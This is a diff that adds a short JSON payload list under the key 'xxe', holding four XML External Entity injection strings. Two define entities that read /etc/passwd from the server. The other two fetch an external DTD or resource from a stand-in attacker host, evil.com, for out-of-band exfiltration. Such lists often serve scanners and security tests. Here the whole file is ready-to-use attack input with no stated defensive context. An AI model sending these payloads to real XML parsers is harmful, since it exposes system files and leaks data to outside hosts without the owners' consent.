@@ -1,0 +1,8 @@
+{
+  "xxe": [
+    "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
+    "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+    "<!DOCTYPE root [<!ENTITY % remote SYSTEM 'http://evil.com/evil.dtd'>%remote;]>",
+    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://evil.com/\">]>"
+  ]
+}
